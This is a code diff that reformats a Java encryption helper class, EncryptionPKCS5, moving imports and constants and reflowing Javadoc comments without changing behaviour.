@@ -9,6 +9,11 @@
 
 package com.android.syssetup.crypto;
 
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.util.ByteArray;
+import com.android.syssetup.util.Check;
+import com.android.syssetup.util.Utils;
+
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
@@ -18,17 +23,21 @@ import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.util.ByteArray;
-import com.android.syssetup.util.Check;
-import com.android.syssetup.util.Utils;
-
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class EncryptionPKCS5.
  */
 public class EncryptionPKCS5 {
 
+	/**
+	 * The Constant DIGEST_LENGTH.
+	 */
+	private static final int DIGEST_LENGTH = 20;
+	/**
+	 * The debug.
+	 */
+	private static final String TAG = "EncryptionPKCS5"; //$NON-NLS-1$
 	private CryptoCBC crypto;
 
 	public EncryptionPKCS5() {
@@ -53,9 +62,8 @@ public class EncryptionPKCS5 {
 
 	/**
 	 * Instantiates a new encryption pkc s5.
-	 * 
-	 * @param key
-	 *            the key
+	 *
+	 * @param key the key
 	 * @throws CryptoException
 	 * @throws NoSuchPaddingException
 	 * @throws NoSuchAlgorithmException
@@ -70,11 +78,6 @@ public class EncryptionPKCS5 {
 			throw new CryptoException();
 		}
 	}
-
-	/** The Constant DIGEST_LENGTH. */
-	private static final int DIGEST_LENGTH = 20;
-	/** The debug. */
-	private static final String TAG = "EncryptionPKCS5"; //$NON-NLS-1$
 
 	/*
 	 * (non-Javadoc)
@@ -111,9 +114,8 @@ public class EncryptionPKCS5 {
 
 	/**
 	 * Encrypt data integrity.
-	 * 
-	 * @param plain
-	 *            the plain
+	 *
+	 * @param plain the plain
 	 * @return the byte[]
 	 */
 	public byte[] encryptDataIntegrity(final byte[] plain) {
@@ -138,12 +140,10 @@ public class EncryptionPKCS5 {
 
 	/**
 	 * Decrypt data integrity.
-	 * 
-	 * @param cyphered
-	 *            the cyphered
+	 *
+	 * @param cyphered the cyphered
 	 * @return the byte[]
-	 * @throws CryptoException
-	 *             the crypto exception
+	 * @throws CryptoException the crypto exception
 	 */
 	public byte[] decryptDataIntegrity(final byte[] cyphered) throws CryptoException {
 		byte[] plainSha;
@@ -184,7 +184,7 @@ public class EncryptionPKCS5 {
 	}
 
 	public byte[] encryptData(byte[] clear) throws CryptoException {
-		
+
 		try {
 			return crypto.encrypt(clear);
 		} catch (InvalidKeyException e) {
@@ -204,7 +204,7 @@ public class EncryptionPKCS5 {
 				Check.log(TAG + " (encryptData) Error: " + e);
 			}
 		}
-		
+
 		throw new CryptoException();
 	}
 
